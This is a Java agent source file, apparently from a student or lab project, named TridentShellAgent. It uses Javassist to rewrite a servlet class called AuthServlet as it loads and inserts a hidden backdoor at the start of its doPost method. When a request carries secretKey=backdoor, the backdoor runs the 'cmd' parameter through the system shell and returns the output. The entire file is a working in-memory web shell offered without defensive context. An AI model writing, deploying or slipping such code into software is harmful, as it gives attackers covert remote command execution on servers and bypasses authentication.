package com.da_uit.agent;
import javassist.*;
import java.lang.instrument.*;
import java.security.ProtectionDomain;

public class TridentShellAgent {

    public static void premain(String agentArgs, Instrumentation inst) {
        System.out.println("Agent loaded successfully");
        inst.addTransformer(new MyTransformer());
    }

    private static class MyTransformer implements ClassFileTransformer {

        @Override
        public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,
                                ProtectionDomain protectionDomain, byte[] classfileBuffer) {
            if (className != null && className.equals("AuthServlet")) {
                System.out.println("Transforming class: " + className);
                try {
                    ClassPool pool = ClassPool.getDefault();
                    pool.insertClassPath(new LoaderClassPath(loader));
                    CtClass ctClass = pool.makeClass(new java.io.ByteArrayInputStream(classfileBuffer));

                    if (ctClass.subclassOf(pool.get("jakarta.servlet.http.HttpServlet"))) {
                        CtMethod doPost = ctClass.getDeclaredMethod("doPost");
                        String backdoorCode = 
                            "if (\"backdoor\".equals($1.getParameter(\"secretKey\"))) { " +
                            "    System.out.println(\"Backdoor activated with cmd: \" + $1.getParameter(\"cmd\")); " +
                            "    String cmd = $1.getParameter(\"cmd\"); " +
                            "    if (cmd != null && !cmd.isEmpty()) { " +
                            "        try { " +
                            "            String os = System.getProperty(\"os.name\").toLowerCase(); " +
                            "            java.lang.ProcessBuilder pb; " +
                            "            if (os.contains(\"win\")) { " +
                            "                pb = new java.lang.ProcessBuilder(\"cmd.exe\", \"/c\", cmd); " +
                            "            } else { " +
                            "                pb = new java.lang.ProcessBuilder(\"/bin/sh\", \"-c\", cmd); " +
                            "            } " +
                            "            System.out.println(\"Executing command: \" + String.join(\" \", pb.command())); " +
                            "            java.lang.Process p = pb.start(); " +
                            "            java.io.BufferedReader stdInput = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream())); " +
                            "            java.io.BufferedReader stdError = new java.io.BufferedReader(new java.io.InputStreamReader(p.getErrorStream())); " +
                            "            StringBuilder output = new StringBuilder(); " +
                            "            String line; " +
                            "            while ((line = stdInput.readLine()) != null) { output.append(line).append(\"\\n\"); } " +
                            "            while ((line = stdError.readLine()) != null) { output.append(\"ERROR: \").append(line).append(\"\\n\"); } " +
                            "            p.waitFor(); " +
                            "            $2.setContentType(\"text/plain\"); " +
                            "            $2.getWriter().print(output.toString()); " +
                            "        } catch (Exception e) { " +
                            "            $2.sendError(500, \"Lỗi khi thực thi lệnh: \" + e.getMessage()); " +
                            "        } " +
                            "    } else { " +
                            "        $2.sendError(400, \"Thiếu tham số cmd\"); " +
                            "    } " +
                            "    return; " +
                            "} ";
                        doPost.insertBefore(backdoorCode);

                        byte[] modifiedClassFile = ctClass.toBytecode();
                        ctClass.detach();
                        return modifiedClassFile;
                    }
                } catch (Exception e) {
                    e.printStackTrace(System.err);
                }
            }
            return classfileBuffer;
        }
    }
}